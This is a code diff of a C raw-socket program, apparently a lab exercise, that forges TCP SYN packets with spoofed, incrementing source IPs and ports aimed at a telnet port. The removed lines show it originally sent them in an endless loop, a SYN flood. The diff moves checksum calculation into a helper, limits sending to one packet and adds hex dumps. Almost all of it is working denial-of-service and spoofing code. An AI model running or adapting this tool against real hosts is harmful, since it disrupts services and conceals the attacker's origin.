@@ -6,6 +6,7 @@
 #include <netinet/ip.h>
 #include <arpa/inet.h>
 
+
 //For calculating TCP checksum
 struct pseudo_hdr
 {
@@ -41,8 +42,21 @@ uint16_t chksum(const uint16_t *ptr, int len){
     return(answer);
 }
 
+uint16_t tcpCS(const struct iphdr *iph, const struct tcphdr *tcph, uint16_t tcp_len){
+    struct pseudo_hdr psh;
+    psh.src_ip = iph->saddr;
+    psh.dst_ip = iph->daddr;
+    psh.reserved = 0;
+    psh.protocol = IPPROTO_TCP;
+    psh.tcp_len = htons(tcp_len);
+
+    memcpy(&psh.tcph, tcph, sizeof(struct tcphdr));
+    return (chksum((uint16_t *)&psh, sizeof(struct pseudo_hdr)));
+}
+
 int main(void){
-    char *target = "10.0.2.15";
+    char *src_addr = "1.2.3.4";
+    char *dst_addr = "10.0.2.15";
     uint16_t src_port = 15511;
     uint16_t dst_port = 23;
 
@@ -51,17 +65,16 @@ int main(void){
     //Define a new packet based on common MTU
     char *packet = malloc(1500);
     char src_ip[32];
-    strcpy(src_ip, "1.2.3.4");
+    strcpy(src_ip, src_addr);
     //Define headers
     struct iphdr *iph = (struct iphdr*) packet;
     struct tcphdr *tcph = (struct tcphdr*) (packet + sizeof(struct ip));
     struct sockaddr_in sin;
-    struct pseudo_hdr psh;
     
     //Setting up socket
     sin.sin_family = AF_INET;
     sin.sin_port = htons(dst_port);
-    sin.sin_addr.s_addr = inet_addr(target);
+    sin.sin_addr.s_addr = inet_addr(dst_addr);
 
     //clear the packet buffer
     memset(packet, 0, 1500);
@@ -88,25 +101,16 @@ int main(void){
     tcph->seq = 1551;
     tcph->ack_seq = 0;
     tcph->doff = 5; /* No TCP options */
-    //tcph->fin = 0;
+    tcph->fin = 0;
     tcph->syn = 1; /* This is synchronization packet */
-    //tcph->rst = 0;
-    //tcph->psh = 0;
-    //tcph->ack = 0;
-    //tcph->urg = 0;
+    tcph->rst = 0;
+    tcph->psh = 0;
+    tcph->ack = 0;
+    tcph->urg = 0;
     tcph->window = htons(5000);
     tcph->check = 0; 
     tcph->urg_ptr = 0;
 
-    //Fill TCP Pseudo header
-    psh.src_ip = inet_addr(src_ip);
-    psh.dst_ip = sin.sin_addr.s_addr;
-    psh.reserved = 0;
-    psh.protocol = IPPROTO_TCP;
-    psh.tcp_len = htons(20);
-    //Calculate the TCP checksum
-    memcpy(&psh.tcph, tcph, sizeof(struct tcphdr));
-    tcph->check = chksum((uint16_t *)&psh, sizeof(struct pseudo_hdr));
 
     //Tell kernel that we construct the header
     int _one = 1;
@@ -116,15 +120,20 @@ int main(void){
         exit(0);
     }
 
-    int once = 5;
-    while(1){
+    int once = 1;
+    while(once){
         //Increase the source ip and port
-        tcph->check = 0;
         iph->saddr = iph->saddr + 1;
         tcph->source = tcph->source + 1;
-        psh.src_ip = iph->saddr;
-        memcpy(&psh.tcph, tcph, sizeof(struct tcphdr));
-        tcph->check = chksum((uint16_t *)&psh, sizeof(struct pseudo_hdr));
+        //Zero the checksum for packet reuse
+        tcph->check = 0;
+        //Calculate the updated checksum for TCP
+        tcph->check = tcpCS(iph, tcph, 20);
+
+        for(int i=0; i<iph->tot_len; i++){
+            printf("%08x \n", packet[i]);
+        }
+        printf("\n");
 
         //Send out the packet
         if(sendto(sock, packet, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin)) < 0){
